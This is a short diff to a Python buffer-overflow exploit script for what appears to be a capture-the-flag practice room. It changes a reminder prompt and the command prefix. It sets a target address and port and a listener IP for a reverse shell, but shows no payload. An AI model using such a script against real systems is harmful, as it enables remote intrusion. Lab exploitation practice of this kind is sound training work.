@@ -5,12 +5,12 @@ from time import sleep
 
 timeout = 5
 
-reminder = raw_input ("Remember to change addr (target)  and lhost/lport"
+reminder = raw_input ("Remember to change addr (target), lhost/lport, and cmd")
 
 addr = ('10.10.177.32',1337)
 
 #Add command to send prepended to the buffer, eg. 'OVERFLOW6 .' for Tib3rius room overflow6
-cmd = raw_input("Enter cmd name, such as 'OVERFLOW6' ")
+cmd = ""
 
 #your listener IP to get reverse shell, Required for the 'shell' step
 lhost = "10.4.11.217"
